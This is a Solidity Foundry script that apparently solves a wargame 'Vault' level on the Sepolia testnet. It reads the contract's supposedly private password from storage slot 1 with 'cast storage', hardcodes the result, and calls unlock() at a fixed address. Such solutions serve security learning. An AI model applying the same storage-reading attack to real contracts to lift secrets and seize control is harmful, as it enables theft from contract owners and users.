// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Vault} from "../src/Level9Vault.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level9VaultSolv is Script {
    function run() external {
        // read the password in the storage location 1 : cast storage --rpc-url $SEPOLIA_RPC_URL 0x55Dd621dDfc50112BB955D09A2774F3Dc8d70717 1. password - "A very strong secret password :)"
        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        vm.startBroadcast();
        Vault vault = Vault(0x55Dd621dDfc50112BB955D09A2774F3Dc8d70717);
        vault.unlock(password);
        vm.stopBroadcast();
    }
}
